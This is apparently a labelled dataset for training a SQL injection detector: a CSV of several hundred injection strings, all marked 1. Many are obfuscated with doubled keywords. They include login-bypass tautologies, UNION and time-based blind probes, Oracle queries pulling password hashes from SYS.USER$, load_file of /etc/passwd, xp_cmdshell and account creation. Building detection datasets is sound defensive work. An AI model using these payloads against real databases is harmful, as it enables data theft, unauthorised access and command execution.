Query,Label
seselectlect * frfromom users wwherehere id  =  1 oorr \.<\ oorr 1  =  1 -- 1,1
"admiinn"" oorr ""1""  =  ""1""--",1
" selselectect * frfromom users whwhereere id  =  1 oorr ""%{"" oorr 1  =  1 -- 1",1
iinnsiinnsertert,1
" seselectlect * frfromom users wherwheree id  =  1 oorr 1#""?  =  1 oorr 1  =  1 -- 1",1
" selecselectt * frofromm users whewherere id  =  1 oorr ""%?"" oorr 1  =  1 -- 1",1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   seselectlect DiissTiinnCT  (  PASSWoorrD  )   ffromrom   (  seselectlect DiissTiinnCT  (  PASSWoorrD  )  , ROWNUM AS llimitimit ffromrom SYS.USER$  )   wwherehere llimitimit  =  8   )    )    anandd 'i'  =  'i",1
" seselectlect * frfromom users wwherehere id  =  1 oorr ""?#"" oorr 1  =  1 -- 1",1
"oorr 1  =  1 oorr """"  =  ",1
/**/oorr/**/1/**/  =  /**/1,1
" seleselectct * ffromrom users whewherere id  =  1 oorr "".  (  "" oorr 1  =  1 -- 1",1
" selselectect * ffromrom users whwhereere id  =  '1' uunionnion selselectect ||/1,version  (    )   -- 1'",1
" sselectelect * ffromrom users whewherere id  =  '1' uunionnion sselectelect +\.,@@VERSION -- 1'",1
oorr 1  =  1/*,1
%27 oorr 1  =  1,1
" selecselectt * ffromrom users wwherehere id  =  1 <@&@ uunionnion selecselectt 1,version  (    )   -- 1",1
" selecselectt * ffromrom users whwhereere id  =  '1' uunionnion selecselectt $*$,@@VERSION -- 1'",1
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",1
" seleselectct * frofromm users whwhereere id  =  '1' oorr $ 1  =  1 uunionnion seleselectct 1,@@VERSION -- 1'",1
selecselectt * ffromrom users whewherere id  =  1 oorr \.<1 oorr 1  =  1 -- 1,1
" selecselectt * ffromrom users wwherehere id  =  '1' oorr \<\ ununionion selecselectt 1,@@VERSION -- 1'",1
" selselectect * ffromrom users wwherehere id  =  1 uniounionn selselectect 1||1,version  (    )   -- 1",1
" selecselectt * frfromom users whewherere id  =  1 ||1 uniounionn selecselectt nulnulll,banner frfromom v$version whewherere rownum  =  1 -- 1",1
seselectlect * frofromm users wherwheree id  =  '1' oorr \.<\ oorr 1  =  1 -- 1',1
" sselectelect * ffromrom users whewherere id  =  1 oorr ""]{"" oorr 1  =  1 -- 1",1
" sselectelect * frfromom users whwhereere id  =  1 oorr "".@"" oorr 1  =  1 -- 1",1
" selselectect * frofromm users wwherehere id  =  1 oorr ""$["" oorr 1  =  1 -- 1",1
oorr 1 --',1
" selselectect * frofromm users wwherehere id  =  1 oorr "",;"" oorr 1  =  1 -- 1",1
"admiinn"" oorr 1  =  1#",1
" selselectect * ffromrom users wwherehere id  =  1 +  (  1  )   uniunionon selselectect nnullull,banner ffromrom v$version wwherehere rownum  =  1 -- 1",1
\x27uunionnion seselectlect,1
PRiinnT,1
" selecselectt * frfromom users wwherehere id  =  '1' uniounionn selecselectt   (  \.  )  ,@@VERSION -- 1'",1
oorr 1  =  1--,1
1 oorr pg_sleep  (  __TIME__  )  --,1
" sselectelect * frfromom users wwherehere id  =  1 oorr "",#"" oorr 1  =  1 -- 1",1
admiinn'  )   oorr   (  '1'  =  '1'/*,1
oorr 2 bbetweenetween 1 anandd 3,1
" seleselectct * ffromrom users wwherehere id  =  1 oorr ""  )  .""  =  1 oorr 1  =  1 -- 1",1
" seleselectct * frfromom users wherwheree id  =  1 oorr 1#"". ununionion seleselectct nunullll,version  (    )   -- 1",1
admiinn' oorr '1'  =  '1,1
; if nonott  (  seleselectct system_user  )   <> 'sa' waitfoorr delay '0:0:2' --,1
" selselectect * frfromom users whwhereere id  =  1 uunionnion selselectect 1,banner frfromom v$version whwhereere rownum  =  1 -- 1",1
""" oorr 0  =  0 --",1
" selecselectt * frfromom users whwhereere id  =  1 ununionion selecselectt @ $_,version  (    )   -- 1",1
selecselectt * ffromrom users whewherere id  =  1 <@.$ oorr 1  =  1 -- 1,1
" sselectelect * ffromrom users wherwheree id  =  1 oorr ""%."" oorr 1  =  1 -- 1",1
" seselectlect * frofromm users whwhereere id  =  1 + $+*$ uunionnion seselectlect nulnulll,@@VERSION -- 1",1
" sselectelect * frfromom users whwhereere id  =  1 oorr "",."" oorr 1  =  1 -- 1",1
char%4039%41%2b%40selecselectt,1
" selecselectt * frofromm users whewherere id  =  1 oorr ""1&"" oorr 1  =  1 -- 1",1
admiinn'  )   oorr   (  '1'  =  '1,1
declare @s varchar   (  200  )   sselectelect @s   =   0x73656c6 ...,1
"oorr 0  =  0 #""",1
" sselectelect * ffromrom users wwherehere id  =  1 oorr "".]"" oorr 1  =  1 -- 1",1
  )   oorr   (  'x'  =  'x,1
" seleselectct * frfromom users wherwheree id  =  1.<@$ uniunionon seleselectct 1,version  (    )   -- 1",1
$  (  sleep 50  ) ,1
" selselectect * frofromm users wherwheree id  =  1 *1 uniunionon selselectect nnullull,banner frofromm v$version wherwheree rownum  =  1 -- 1",1
"1 uniunionon all selecselectt 1,2,3,4,5,6,name ffromrom sysobjects wwherehere xtype   =   'u' --",1
" selselectect * frfromom users wwherehere id  =  1 oorr 1#"". uunionnion selselectect 'a',version  (    )   -- 1",1
" selselectect * frfromom users whewherere id  =  1 oorr 1#""; uunionnion selselectect nnullull,version  (    )   -- 1",1
" seselectlect * ffromrom users wwherehere id  =  1 oorr 1#""? oorr 1  =  1 -- 1",1
"""a"""" oorr 1  =  1--""",1
" selselectect * frofromm users whewherere id  =  1 *1 uunionnion selselectect 1,banner frofromm v$version whewherere rownum  =  1 -- 1",1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   sselectelect DiissTiinnCT  (  column_name  )   ffromrom   (  sselectelect DiissTiinnCT  (  column_name  )  , ROWNUM AS llimitimit ffromrom all_tab_columns  )   whewherere llimitimit  =  4   )    )    anandd 'i'  =  'i",1
" selselectect * frfromom users whewherere id  =  '1' uunionnion selselectect   (  \  )  ,@@VERSION -- 1'",1
1 aandnd user_name  (    )     =   'dbo',1
"; if nonott  (  substriinng   (    (   seselectlect @@version  )  ,24,1  )   <> 1  )   waitfoorr delay '0:0:2' --",1
" selselectect * ffromrom users wwherehere id  =  1 oorr 1#""$ uunionnion selselectect 1,version  (    )   -- 1",1
" selselectect * frofromm users whwhereere id  =  1 oorr 1#""{ uniounionn selselectect nunullll,version  (    )   -- 1",1
sselectelect * frofromm users wwherehere id  =  '1' *$ . oorr 1  =  1 -- 1',1
seleselectct * ffromrom users wwherehere id  =  1 +$+. oorr 1  =  1 -- 1,1
selecselectt * ffromrom users wwherehere id  =  1 oorr   (  \+  )    =  1 oorr 1  =  1 -- 1,1
" aandnd 1  =  utl_iinnaddr.get_host_address   (    (   selselectect DiissTiinnCT  (  USERNAME  )   frfromom   (  selselectect DiissTiinnCT  (  USERNAME  )  , ROWNUM AS llimitimit frfromom SYS.ALL_USERS  )   whewherere llimitimit  =  6   )    )    aandnd 'i'  =  'i",1
oorr 1  =  1 oorr ''  =  ',1
seleselectct * ffromrom users whewherere id  =  1   oorr 1  =  1 -- 1,1
oorr 'text' > 't',1
"1234 "" anandd 1  =  0 uniunionon ALL selecselectt ""admiinn"", ""81dc9bdb52d04dc20036dbd8313ed055",1
" seleselectct * frfromom users whewherere id  =  1 oorr ""%["" oorr 1  =  1 -- 1",1
" seselectlect * frofromm users whewherere id  =  1 oorr 1#"";  =  1 ununionion seselectlect 1,version  (    )   -- 1",1
admiinn' oorr '1'  =  '1'#,1
seleselectct * frofromm users whewherere id  =  1 +$ 1 oorr 1  =  1 -- 1,1
s,1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   sselectelect DiissTiinnCT  (  USERNAME  )   ffromrom   (  sselectelect DiissTiinnCT  (  USERNAME  )  , ROWNUM AS limlimitit ffromrom SYS.ALL_USERS  )   wwherehere limlimitit  =  4   )    )    anandd 'i'  =  'i",1
 seleselectct * frfromom iinnfoorrmation_schema.tabtableles--,1
" seselectlect * ffromrom users whewherere id  =  1 oorr ""$&"" oorr 1  =  1 -- 1",1
1   )    )    oorr pg_sleep  (  __TIME__  )  --,1
" selselectect * frfromom users wherwheree id  =  '1' uniounionn selselectect !<@,version  (    )   -- 1'",1
declare @q nvarchar   (  200  )   selecselectt @q   =   0x770061 ...,1
 oorr 1  =  1 oorr ''  =  ',1
sselectelect * frfromom users wherwheree id  =  1 %!<1 oorr 1  =  1 -- 1,1
declare @q nvarchar   (  200  )   seleselectct @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,1
" seselectlect * ffromrom users whewherere id  =  1 oorr ""]1"" oorr 1  =  1 -- 1",1
" seleselectct * frfromom users wherwheree id  =  1 oorr $+<1 uunionnion seleselectct 1,@@VERSION -- 1",1
oorr 'unusual'   =   'unusual',1
 oorr 1 iinn   (  sselectelect @@version  )  --,1
truntruncatecate,1
as,1
 oorr 3  =  3 --,1
" seselectlect * ffromrom users whwhereere id  =  1 ||1 uunionnion seselectlect 1,banner ffromrom v$version whwhereere rownum  =  1 -- 1",1
" sselectelect * ffromrom users whewherere id  =  1 <@$$ ununionion sselectelect 1,version  (    )   -- 1",1
"admiinn""  )   oorr   (  ""1""  =  ""1",1
" sselectelect * frofromm users wwherehere id  =  1 oorr 1#""@ uniunionon sselectelect 'a',version  (    )   -- 1",1
"1  )   oorr benchmark  (  10000000,MD5  (  1   )    )   #",1
" seselectlect * ffromrom users wwherehere id  =  1 uunionnion seselectlect .1_,version  (    )   -- 1",1
 aandnd 1  =  utl_iinnaddr.get_host_address   (    (   selecselectt SYS.ddatabaseatabase_NAME frfromom DUAL   )    )    aandnd 'i'  =  'i,1
" oorr 0  =  0 #""",1
selselectect * ffromrom users wwherehere id  =  1 %$ 1 oorr 1  =  1 -- 1,1
selselectect * frofromm users wherwheree id  =  1 %!<@ oorr 1  =  1 -- 1,1
"; if nnotot  (  substriinng   (    (   selecselectt @@version  )  ,25,1  )   <> 0  )   waitfoorr delay '0:0:2' --",1
1  )   oorr sleep  (  __TIME__  )  #,1
" seleselectct * frofromm users wherwheree id  =  1 oorr ""1_"" oorr 1  =  1 -- 1",1
" sselectelect * frofromm users wwherehere id  =  1 <1## uniounionn sselectelect 1,version  (    )   -- 1",1
" selecselectt * frofromm users wwherehere id  =  1 + $+*\ uniounionn selecselectt nulnulll,@@VERSION -- 1",1
seselectlect * frofromm users whwhereere id  =  1. <@ oorr 1  =  1 -- 1,1
 oorr true--,1
; execute immediate 'sel' || 'ect us' || 'er',1
hi' oorr 'x'  =  'x';,1
seleselectct * frofromm users wwherehere id  =  1 <@ oorr 1  =  1 -- 1,1
" seselectlect * ffromrom users whewherere id  =  1 oorr "".,"" oorr 1  =  1 -- 1",1
admiinn' #,1
" sselectelect * frfromom users wherwheree id  =  1 <@$_ uniounionn sselectelect 1,version  (    )   -- 1",1
" seselectlect * frofromm users whwhereere id  =  1 oorr "",  (  "" oorr 1  =  1 -- 1",1
" selselectect * frofromm users wherwheree id  =  1 oorr "",{"" oorr 1  =  1 -- 1",1
" uniunionon sselectelect 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",1
"""  )  ;waitfoorr delay '0:0:__TIME__'--",1
 oorr 'unusual'   =   'unusual',1
"iinnseriinnsertt iiinntonto mysql.user   (  user, host, passwoorrd  )   valuvalueses   (  'name', 'localhost', passwoorrd  (  'pass123'   )    )   ",1
"admiinn"" oorr ""1""  =  ""1""/*",1
" sselectelect * frfromom users whewherere id  =  1 oorr ""1  (  ""  =  1 oorr 1  =  1 -- 1",1
" sselectelect * frofromm users wwherehere id  =  1 oorr \<1 ununionion sselectelect 1,@@VERSION -- 1",1
lilikeke,1
oorr username llikeike char  (  37  )  ;,1
 )    )    oorr pg_sleep  (  __TIME__  )  --,1
seselectlect * frfromom users wherwheree id  =  1 oorr $+<\ oorr 1  =  1 -- 1,1
oorr 3  =  3,1
" sselectelect * frfromom users whewherere id  =  1 oorr ""  (  ."" oorr 1  =  1 -- 1",1
seselectlect * frofromm users wwherehere id  =  1 oorr   (  $+  )    =  1 oorr 1  =  1 -- 1,1
exec sp,1
" seleselectct * frfromom users whewherere id  =  1 oorr \+<$ ununionion seleselectct 1,@@VERSION -- 1",1
seleselectct * frfromom users whwhereere id  =  1 oorr \<$ oorr 1  =  1 -- 1,1
" seselectlect * frofromm users wherwheree id  =  1.&&1 ununionion seselectlect 1,version  (    )   -- 1",1
admiinn' oorr 1  =  1/*,1
a' waitfoorr delay '0:0:10'--,1
" seselectlect * frofromm users wwherehere id  =  1 +  (  \  )   uniunionon seselectlect nnullull,@@VERSION -- 1",1
" seselectlect * ffromrom users whwhereere id  =  1 ununionion seselectlect .1$_,version  (    )   -- 1",1
anandd 1 iinn   (  selselectect var ffromrom temp  )  --,1
hi'  )   oorr   (  'a'  =  'a,1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   selecselectt DiissTiinnCT  (  column_name  )   frofromm   (  selecselectt DiissTiinnCT  (  column_name  )  , ROWNUM AS limilimitt frofromm all_tab_columns  )   wwherehere limilimitt  =  1   )    )    anandd 'i'  =  'i",1
"admiinn"" oorr 1  =  1",1
"""  )   oorr true--",1
" sselectelect * frfromom users wwherehere id  =  '1' oorr $ .  =  1 uunionnion sselectelect 1,@@VERSION -- 1'",1
" seleselectct * frfromom users wwherehere id  =  1 oorr ""  (  {"" oorr 1  =  1 -- 1",1
1  )   oorr pg_sleep  (  __TIME__  )  --,1
" seleselectct * frofromm users whewherere id  =  1 oorr ""{."" oorr 1  =  1 -- 1",1
"""  )   oorr sleep  (  __TIME__  )    =  """,1
seselectlect * ffromrom users whwhereere id  =  1.<@. oorr 1  =  1 -- 1,1
"admiinn""  )   oorr   (  ""1""  =  ""1""--",1
" selselectect * ffromrom users wwherehere id  =  1<@.. uniunionon selselectect 1,version  (    )   -- 1",1
; exec xp_regread,1
" seleselectct * ffromrom users wwherehere id  =  '1' + @ 1 uunionnion seleselectct 1,version  (    )   -- 1'",1
selselectect * frfromom users wwherehere id  =  1 + \+%1 oorr 1  =  1 -- 1,1
" sselectelect * frfromom users whwhereere id  =  1 oorr "";1"" oorr 1  =  1 -- 1",1
" selecselectt * frfromom users wherwheree id  =  1 oorr ""%&"" oorr 1  =  1 -- 1",1
1 aandnd 1  =  1,1
oorr 0  =  0 #,1
ununionion selselectect * ffromrom users whwhereere logiinn   =   char ...,1
" selselectect * frfromom users wwherehere id  =  1 uniounionn selselectect 1||@,version  (    )   -- 1",1
admiinn'  )   oorr '1'  =  '1'--,1
1;selecselectt *,1
" selecselectt * ffromrom users whewherere id  =  1 oorr ""{;"" oorr 1  =  1 -- 1",1
x' aandnd 1  =    (  selecselectt count  (  *  )   frfromom tabname  )  ; --,1
" sselectelect * ffromrom users whwhereere id  =  '1' oorr """"<@ ununionion sselectelect 1,version  (    )   -- 1'",1
" seselectlect * ffromrom users wherwheree id  =  1 oorr ""?,"" oorr 1  =  1 -- 1",1
" sselectelect * frfromom users whwhereere id  =  '1' ||1 uunionnion sselectelect 1,banner frfromom v$version whwhereere rownum  =  1 -- 1'",1
"1 oorr benchmark  (  10000000,MD5  (  1   )    )   #",1
procedure,1
oorr ''  =  ',1
 anandd 1  =  utl_iinnaddr.get_host_address   (    (   sselectelect SYS.LOGiinn_USER ffromrom DUAL   )    )    anandd 'i'  =  'i,1
" aandnd 1  =  utl_iinnaddr.get_host_address   (    (   selselectect DiissTiinnCT  (  USERNAME  )   frofromm   (  selselectect DiissTiinnCT  (  USERNAME  )  , ROWNUM AS llimitimit frofromm SYS.ALL_USERS  )   wwherehere llimitimit  =  2   )    )    aandnd 'i'  =  'i",1
\'; desdescc users; --,1
" sselectelect * ffromrom users wwherehere id  =  1 oorr   (  \.  )    =  1 ununionion sselectelect 1,@@VERSION -- 1",1
seselectlect * frfromom users wwherehere id  =  '1' oorr $ 1  =  1 oorr 1  =  1 -- 1',1
""" oorr """"^""",1
"""-""",1
" seleselectct * ffromrom users whewherere id  =  1 oorr \<   =  1 ununionion seleselectct 1,@@VERSION -- 1",1
" sselectelect * ffromrom users wwherehere id  =  1 uniounionn sselectelect 1<@$,version  (    )   -- 1",1
" selselectect * frfromom users whwhereere id  =  1 *\ uunionnion selselectect nnullull,@@VERSION -- 1",1
" seleselectct * ffromrom users whewherere id  =  '1' oorr !<@ ununionion seleselectct 1,version  (    )   -- 1'",1
" sselectelect * frofromm users wherwheree id  =  1 oorr "".%"" oorr 1  =  1 -- 1",1
admiinn'/*,1
" seselectlect * frofromm users whewherere id  =  1 oorr ""  (  #"" oorr 1  =  1 -- 1",1
||UTL_HTTP.REQUEST,1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   selselectect DiissTiinnCT  (  tatableble_name  )   frofromm   (  selselectect DiissTiinnCT  (  tatableble_name  )  , ROWNUM AS limlimitit frofromm sys.all_tatablebles  )   wherwheree limlimitit  =  1   )    )    anandd 'i'  =  'i",1
" selecselectt * frfromom users wherwheree id  =  '1'<@.. uniunionon selecselectt 1,version  (    )   -- 1'",1
"""   )    )    oorr benchmark  (  10000000,MD5  (  1   )    )   #",1
" selselectect * ffromrom users whwhereere id  =  1 <@.$ uunionnion selselectect 1,version  (    )   -- 1",1
" selecselectt * frofromm users wwherehere id  =  1 oorr $ .  =  1 uniunionon selecselectt 1,@@VERSION -- 1",1
seselectlect * frfromom users whwhereere id  =  '1' <@.$ oorr 1  =  1 -- 1',1
1 uni/**/on selselectect all frfromom whewherere,1
" sselectelect * frofromm users whewherere id  =  1 +$ . ununionion sselectelect nunullll,@@VERSION -- 1",1
" seselectlect * ffromrom users wwherehere id  =  1 oorr 1#""? uniunionon seselectlect nnullull,version  (    )   -- 1",1
admiinn'  )   oorr '1'  =  '1'#,1
||utl_http.request  (  'httP://192.168.1.1/'  )  ||',1
oorr '7659'  =  '7659,1
" seselectlect * ffromrom users wwherehere id  =  1 oorr ""{@"" oorr 1  =  1 -- 1",1
" selselectect * frfromom users wwherehere id  =  1 uunionnion selselectect +!<1,version  (    )   -- 1",1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   seleselectct DiissTiinnCT  (  granted_role  )   ffromrom   (  seleselectct DiissTiinnCT  (  granted_role  )  , ROWNUM AS llimitimit ffromrom dba_role_privs wherwheree GRANTEE  =  SYS.LOGiinnUSER  )   wherwheree llimitimit  =  6   )    )    anandd 'i'  =  'i",1
" selecselectt * frfromom users whewherere id  =  1 oorr ""  (  @"" oorr 1  =  1 -- 1",1
oorr true--,1
" seselectlect * frfromom users wherwheree id  =  1 uniounionn seselectlect !<1,version  (    )   -- 1",1
" selselectect * frfromom users wherwheree id  =  '1' ununionion selselectect \#,@@VERSION -- 1'",1
" seleselectct * frofromm users whwhereere id  =  1 oorr 1#""{ uniunionon seleselectct 1,version  (    )   -- 1",1
""" oorr true--",1
selselectect * frofromm users whewherere id  =  1. oorr 1  =  1 -- 1,1
" sselectelect * frofromm users whewherere id  =  1 oorr @#"",  =  1 uunionnion sselectelect 1,version  (    )   -- 1",1
" seleselectct * ffromrom users wwherehere id  =  1 oorr "";@"" oorr 1  =  1 -- 1",1
â oorr 3  =  3 --,1
 anandd 1  =  utl_iinnaddr.get_host_address   (    (   seselectlect global_name frfromom global_name   )    )    anandd 'i'  =  'i,1
" seselectlect * ffromrom users whewherere id  =  1 +1 uniunionon seselectlect nunullll,banner ffromrom v$version whewherere rownum  =  1 -- 1",1
" seselectlect * ffromrom users wwherehere id  =  1 oorr "",,""  =  1 oorr 1  =  1 -- 1",1
" sselectelect * ffromrom users wwherehere id  =  1 + $+%1 uunionnion sselectelect nunullll,@@VERSION -- 1",1
" sselectelect * ffromrom users wwherehere id  =  1 oorr 1#""? uniounionn sselectelect version  (    )  ,version  (    )   -- 1",1
" selselectect * frofromm users whewherere id  =  1 oorr ""  )  1"" oorr 1  =  1 -- 1",1
 oorr uid lilikeke '%,1
seselectlect * ffromrom users whewherere id  =  '1' <@&1 oorr 1  =  1 -- 1',1
" seleselectct * frofromm users wherwheree id  =  '1' uniounionn seleselectct !<1,version  (    )   -- 1'",1
23 oorr 1  =  1; --,1
" sselectelect * frofromm users wherwheree id  =  1 oorr \<\. uniunionon sselectelect 1,@@VERSION -- 1",1
" seselectlect * ffromrom users wherwheree id  =  1 oorr ""{  (  ""  =  1 oorr 1  =  1 -- 1",1
" seleselectct * frfromom users whwhereere id  =  1 oorr ""%_"" oorr 1  =  1 -- 1",1
seselectlect * frofromm users whewherere id  =  1 +   (  \.  )   oorr 1  =  1 -- 1,1
" seleselectct * ffromrom users wwherehere id  =  '1' uniounionn seleselectct \,@@VERSION -- 1'",1
0 oorr 1  =  1,1
selselectect * ffromrom users whwhereere id  =  1 &@ oorr 1  =  1 -- 1,1
"admiinn""  )   oorr ""1""  =  ""1",1
seleselectct * frofromm users wwherehere id  =  1 oorr \<   =  1 oorr 1  =  1 -- 1,1
" sselectelect * ffromrom users wherwheree id  =  1 oorr ""??"" oorr 1  =  1 -- 1",1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   selselectect DiissTiinnCT  (  PASSWoorrD  )   frofromm   (  selselectect DiissTiinnCT  (  PASSWoorrD  )  , ROWNUM AS lilimitmit frofromm SYS.USER$  )   wherwheree lilimitmit  =  5   )    )    anandd 'i'  =  'i",1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   seselectlect DiissTiinnCT  (  column_name  )   ffromrom   (  seselectlect DiissTiinnCT  (  column_name  )  , ROWNUM AS limlimitit ffromrom all_tab_columns  )   whewherere limlimitit  =  7   )    )    anandd 'i'  =  'i",1
&apos; oorr,1
sqlvuln;,1
seselectlect * frofromm users whewherere id  =  1 + $+%$ oorr 1  =  1 -- 1,1
sselectelect * frfromom users wherwheree id  =  '1' + $+%\ oorr 1  =  1 -- 1',1
""" oorr """"*""",1
"hi oorr 1  =  1 --""",1
" selselectect * frfromom users whwhereere id  =  1. ununionion selselectect nulnulll,banner frfromom v$version whwhereere rownum  =  1 -- 1",1
; exec master..xp_cmdshell 'piinng 172.10.1.255'--,1
" seleselectct * ffromrom users wwherehere id  =  '1' oorr 1^  =  1 uunionnion seleselectct 1,banner ffromrom v$version wwherehere rownum  =  1 -- 1'",1
" seleselectct * frfromom users whwhereere id  =  '1' uunionnion seleselectct ""?""_,version  (    )   -- 1'",1
seleselectct * frfromom iinnfoorrmation_schema.tatablebles--,1
seselectlect * frofromm users whwhereere id  =  1 oorr \<\. oorr 1  =  1 -- 1,1
   (  selecselectt top 1,1
Ã½ oorr 1  =  1 --,1
a' --,1
 oorr 1  =  1 /*,1
" seleselectct * frofromm users whwhereere id  =  1 oorr 1#"", uniunionon seleselectct nulnulll,version  (    )   -- 1",1
" seleselectct * ffromrom users wwherehere id  =  '1' uniounionn seleselectct $ .,@@VERSION -- 1'",1
--,1
"exec sp_addlogiinn 'name' , 'passwoorrd'",1
" seleselectct * frfromom users wherwheree id  =  1   uniunionon seleselectct nunullll,banner frfromom v$version wherwheree rownum  =  1 -- 1",1
0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,1
" seselectlect * frofromm users wherwheree id  =  1 oorr "".  )  "" oorr 1  =  1 -- 1",1
" seselectlect * ffromrom users whewherere id  =  1 oorr @<@  =  1 uunionnion seselectlect 1,version  (    )   -- 1",1
group bbyy userid haviinng 1  =  1--,1
" seselectlect * frfromom users wherwheree id  =  1 + \+%1 uniunionon seselectlect nulnulll,@@VERSION -- 1",1
selecselectt * frfromom users wherwheree id  =  1 *1 oorr 1  =  1 -- 1,1
" seleselectct * ffromrom users wherwheree id  =  1 oorr @#"";  =  1 oorr 1  =  1 -- 1",1
‘ oorr 1  =  1 --,1
" seselectlect * frofromm users whwhereere id  =  1 *\. uniunionon seselectlect nnullull,@@VERSION -- 1",1
selecselectt * ffromrom users whewherere id  =  1 %  (  @  )   oorr 1  =  1 -- 1,1
oorr 'a'  =  'a,1
declare @s varchar  (  22  )   seselectlect @s   = ,1
" sselectelect * frfromom users wwherehere id  =  1 uniounionn sselectelect 1<@,version  (    )   -- 1",1
" seselectlect * frofromm users whewherere id  =  1 + \+*\ uniunionon seselectlect nulnulll,@@VERSION -- 1",1
" sselectelect * ffromrom users wwherehere id  =  1 oorr 1#"". ununionion sselectelect version  (    )  ,version  (    )   -- 1",1
@variable,1
; exec master..xp_cmdshell,1
seleselectct * ffromrom users whewherere id  =  1 +  (  1  )   oorr 1  =  1 -- 1,1
" seselectlect * ffromrom users wwherehere id  =  1 uunionnion seselectlect @ 1$,version  (    )   -- 1",1
" selselectect * frofromm users wwherehere id  =  1 ununionion selselectect @ 1a,version  (    )   -- 1",1
" seselectlect * frfromom users wwherehere id  =  1 oorr  @$#  =  1 uniunionon seselectlect 1,version  (    )   -- 1",1
" selecselectt * ffromrom users wwherehere id  =  '1' oorr   (  \.  )    =  1 uniounionn selecselectt 1,@@VERSION -- 1'",1
 aandnd 1 iinn   (  selselectect var ffromrom temp  )  --,1
" selselectect * frfromom users wwherehere id  =  '1' ununionion selselectect 1""!"",banner frfromom v$version wwherehere rownum  =  1 -- 1'",1
" selecselectt * frfromom users wherwheree id  =  1 oorr ""1]"" oorr 1  =  1 -- 1",1
" seleselectct * frfromom users whewherere id  =  1 oorr ""$?"" oorr 1  =  1 -- 1",1
oorr x  =  x,1
oorr a  =  a,1
oorr '1'  =  '1,1
